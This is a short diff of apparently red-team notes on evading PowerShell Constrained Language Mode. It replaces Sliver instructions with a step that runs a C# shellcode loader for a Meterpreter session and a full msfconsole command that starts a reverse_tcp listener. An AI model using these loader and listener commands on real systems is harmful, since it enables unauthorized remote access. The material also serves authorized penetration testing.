@@ -43,7 +43,7 @@ runspace — outside the constrained one.
 ## Technique 3 — Use a full C# shellcode runner
 
 CLM has no effect on compiled C#. Drop a `cs-loaders/` or `aes-loaders/` runner
-and execute it directly to get a Sliver session, then use Sliver's own
+and execute it directly to get a Meterpreter session, then use Metasploit's own
 post-exploitation instead of PowerShell.
 
 ---
@@ -51,5 +51,5 @@ post-exploitation instead of PowerShell.
 ## Listener
 
 ```bash
-sliver > mtls --lhost <IP> --lport 443
+msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 443; set ExitOnSession false; exploit -j"
 ```
